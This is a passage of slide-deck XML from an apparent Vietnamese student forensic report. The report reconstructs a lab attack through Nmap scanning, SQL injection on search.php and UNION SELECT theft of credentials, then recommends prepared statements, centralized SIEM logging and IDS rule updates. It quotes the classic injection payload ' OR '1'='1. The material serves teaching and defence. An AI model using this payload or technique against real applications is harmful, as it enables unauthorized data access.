              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="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eve.json: Nhật ký cảnh báo xâm nhập và dữ liệu giao thức HTTP/DNS.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-301625" algn="just"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Từ máy chủ SIEM (Wazuh Server - 35.198.230.108):</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="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wazuh_archives.json: Nhật ký lưu trữ tập trung và các cảnh báo mức độ cao.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>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673"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="674" name="Google Shape;674;p62"/>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6.5. Báo cáo kết quả điều tra:</a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="675" name="Google Shape;675;p62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1143000"/>
            <a:ext cx="11030100" cy="19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76" name="Google Shape;676;p62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1328775"/>
            <a:ext cx="6096000" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Kết quả điều tra:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="677" name="Google Shape;677;p62" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666788" y="1299837"/>
            <a:ext cx="285750" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="678" name="Google Shape;678;p62" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800" y="1975275"/>
            <a:ext cx="11029950" cy="3859525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="679" name="Google Shape;679;p62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2232000"/>
            <a:ext cx="9377100" cy="3819000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="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Thông qua việc phân tích xâu chuỗi các nguồn log, điều tra viên đã dựng lại toàn bộ kịch bản tấn công của đối tượng có IP 192.168.221.143 (máy Kali Linux) như sau:</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-301625" algn="just"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Giai đoạn Dò quét (Reconnaissance): Đối tượng sử dụng công cụ Nmap Scripting Engine (NSE) để thực hiện fingerprinting, quét các endpoint như /sdk, /HNAP1, /evox/about nhằm tìm kiếm điểm yếu.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-301625" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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Giai đoạn Khai thác (Exploitation): Phát hiện các payload SQL Injection kinh điển (như ' OR '1'='1) gửi tới search.php. Các mã phản hồi 200 OK xác nhận ứng dụng tồn tại lỗ hổng và đã xử lý các truy vấn độc hại này.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-301625" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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Giai đoạn Chiếm đoạt dữ liệu:</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="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Đối tượng thực hiện kỹ thuật UNION SELECT để xác định tên cơ sở dữ liệu (public_service) và truy xuất thông tin nhạy cảm (username, password) từ bảng users.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Nhật ký query.log ghi nhận các lệnh đặc trưng của hành vi dump database như SHOW FULL TABLES, LOCK TABLES và SELECT ... FROM users vào lúc 05:27:02.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-301625" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="60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Giai đoạn Đột nhập: Sau khi có thông tin xác thực, đối tượng đã đăng nhập thành công qua login.php (mã phản hồi 302) và truy cập trái phép vào khu vực quản trị admin.php.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-301625" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1150"/>
              <a:buFont typeface="JetBrains Mono"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>Hành vi xóa dấu vết (Anti-Forensics): Kẻ tấn công có dấu vết xóa tệp tin tạm sau khi đã đánh cắp dữ liệu thành công</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:srgbClr val="303030"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>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683"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="684" name="Google Shape;684;p63" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="2096541"/>
            <a:ext cx="3486150" cy="1905000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="685" name="Google Shape;685;p63" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4352925" y="2096541"/>
            <a:ext cx="3486150" cy="1905000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="686" name="Google Shape;686;p63" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8124825" y="2096541"/>
            <a:ext cx="3486150" cy="1905000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="687" name="Google Shape;687;p63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="493871" y="4192041"/>
            <a:ext cx="3660600" cy="23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rgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Vá lỗ hổng Ứng dụng</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="688" name="Google Shape;688;p63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="4563516"/>
            <a:ext cx="3486300" cy="775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i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Sử dụng truy vấn tham số hóa (Prepared Statements) trên toàn bộ hệ thống để triệt tiêu hoàn toàn khả năng bị khai thác SQL Injection.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="689" name="Google Shape;689;p63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4265771" y="4192041"/>
            <a:ext cx="3660600" cy="23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rgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Log Tập Trung (SIEM)</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="690" name="Google Shape;690;p63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4352925" y="4563516"/>
            <a:ext cx="3486300" cy="775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i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Duy trì kiến trúc đẩy Log về máy chủ độc lập (như Wazuh trên Cloud) để đảm bảo tính toàn vẹn của chứng cứ số trước các kỹ thuật Anti-Forensics.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="691" name="Google Shape;691;p63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8037671" y="4192041"/>
            <a:ext cx="3660600" cy="23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rgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Giám sát Chủ Động</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="692" name="Google Shape;692;p63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8124825" y="4563516"/>
            <a:ext cx="3486300" cy="775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i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Cập nhật luật (ruleset) cho IDS Suricata thường xuyên. Cấu hình cảnh báo tức thời (Alerting) khi có lưu lượng truy xuất dữ liệu lớn bất thường.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="693" name="Google Shape;693;p63" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId6">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="590550" y="2106066"/>
            <a:ext cx="3467100" cy="1885950"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="694" name="Google Shape;694;p63" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId7">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4362450" y="2106066"/>
            <a:ext cx="3467100" cy="1885950"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="695" name="Google Shape;695;p63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="485775"/>
            <a:ext cx="11581500" cy="51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75" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>VII. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Đề Xuất </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Khắc Phục &amp; Phòng </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Ngừa:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="696" name="Google Shape;696;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1143000"/>
            <a:ext cx="11029950" cy="1905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697" name="Google Shape;697;p63"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId8">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8124825" y="2106075"/>
            <a:ext cx="3486151" cy="188595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701"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="702" name="Google Shape;702;p64"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="305276" y="2652712"/>
            <a:ext cx="11581500" cy="754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900" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Cảm ơn Thầy v</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4900" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>à các bạn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4900" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> đã lắng nghe!</a:t>
            </a:r>
            <a:endParaRPr sz="300">
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="703" name="Google Shape;703;p64"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="3757612"/>
            <a:ext cx="11030100" cy="215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i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
